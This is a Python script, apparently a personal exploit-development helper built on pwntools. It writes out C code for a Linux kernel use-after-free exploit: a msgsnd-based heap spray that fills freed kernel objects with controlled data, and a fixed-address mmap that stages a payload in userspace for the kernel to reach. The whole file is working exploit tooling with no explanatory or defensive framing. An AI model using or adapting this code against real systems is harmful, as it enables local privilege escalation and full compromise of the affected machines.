#!/usr/bin/python
from pwn import *

def generate_msgsnd_spray_c_code(uaf_object):
    if len(uaf_object)<0x30:
        print '[!] object size too small, can not be spray with msgsnd '
        return
    macro = "#define STRUCT_LEN " + str(len(uaf_object)) + '- 0x30'+'\n'
    macro+= "#define NUM_MSG 16"
    header=\
    '''
int msgsnd_for_spray(){
    struct msgbuf msg={0x4141414141414141,{0}};
    int i;
    unsigned long int * ptr;
    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
    memset(msg.mtext, 0, STRUCT_LEN-1);
'''

    num_qword = len(uaf_object[0x30:])/8
    obj = uaf_object[0x30:]
    print 'there are total', num_qword, 'QWORD can be spray'
    layout=''
    for i in range(num_qword):
        layout+='    ptr[' + str(i) + ']=' + hex(u64(obj[8*i:8*i+8]))+';\n'

    suffix='''
    msg.mtext[STRUCT_LEN] = 0;
    for(i=0;i<NUM_MSG;i++){
        if(msgsnd(msqid, &msg, sizeof(msg.mtext),0) == -1){
            perror("msgsnd");

        }
    }
}
'''
              
    return macro+header+layout+suffix


def generate_userspace_mmap(userspace_buffer,userspace_base):
    macro=''    
    header='''
void mmap_payload(){
    void* area;
    void* target_addr;
    unsigned long* ptr;
    '''+'target_addr=(void*)('+hex(userspace_base)+' & 0xfffff000lu);\n'
    mmap_call=\
    '''
    area=mmap(target_addr, 0x8000, PROT_READ | PROT_WRITE,
                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    ptr = area;
    memset(area,0,0x8000);
    '''
    layout=''
    payload = []
    for i in range(4096/8):
        payload.append(u64(userspace_buffer[8*i:8*i+8]))
    #print payload
    for i,num in enumerate(payload):
        #print num
        if num!=0:
            layout += 'ptr = area+'+hex(i*8)+';\n'
            layout += "    *ptr=(unsigned long)"+hex(num)+';\n'

         
    suffix='''
}
    '''
    return macro+header+mmap_call+layout+suffix


def test():
    uaf_object = file('uaf_object.bin','r').read()
    #print len(uaf_object)
    userspace_base = 0xfacea000
    userspace_buffer = file('userspace_buffer.bin','r').read()
    #print len(userspace_buffer)

    print generate_userspace_mmap(userspace_buffer,userspace_base)
    print generate_msgsnd_spray_c_code(uaf_object)
     

if __name__ == '__main__':
    test()
